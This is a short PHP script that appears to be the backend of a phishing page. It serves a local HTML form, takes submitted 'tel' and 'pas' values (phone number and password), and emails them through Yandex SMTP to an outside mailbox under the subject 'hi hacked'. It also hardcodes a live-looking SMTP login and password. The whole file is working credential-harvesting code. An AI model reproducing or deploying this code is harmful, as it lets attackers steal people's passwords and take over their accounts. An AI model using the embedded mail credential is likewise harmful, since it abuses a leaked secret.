<?php  
    use PHPMailer\PHPMailer\PHPMailer;
    use PHPMailer\PHPMailer\SMTP;
    use PHPMailer\PHPMailer\Exception;
    require 'vendor/autoload.php';

    readfile("./index.htm");
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $sender_mail = "robot@updevision.com";
        $saver_mail = "batosflexandsex@yandex.ru";

        $data = json_decode(file_get_contents('php://input'), true);
        try {
            $mail = new PHPMailer();
            //Server settings
            $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
            $mail->isSMTP();                                            //Send using SMTP
            $mail->Host       = 'smtp.yandex.com';                     //Set the SMTP server to send through
            $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
            $mail->Username   = $sender_mail;                     //SMTP username
            $mail->Password   = 'nnrmqqoyfwwkwtvi';                               //SMTP password
            $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
            $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

            //Recipients
            $mail->setFrom($sender_mail, 'robot@updevision.com');
            $mail->addAddress($saver_mail);             

            //Content
            // $mail->isHTML(true);                                  //Set email format to HTML
            $mail->Subject = "hi hacked ";
            $mail->Body = $data["tel"] . PHP_EOL .  $data["pas"];

            $mail->send();
            // echo 'Message has been sent';
        } catch (Exception $e) {
            // echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
        }         
    }
?>  